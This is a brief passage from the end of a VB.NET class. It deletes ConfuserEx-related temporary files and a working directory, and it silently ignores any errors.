            File.Delete(Path.GetTempPath() + "confuser.zip")
            File.Delete(Path.GetTempPath() + "configconfuser.crproj")
            Directory.Delete(text3, True)
        Catch ex As Exception
        End Try
    End Sub
End Class
#End Region
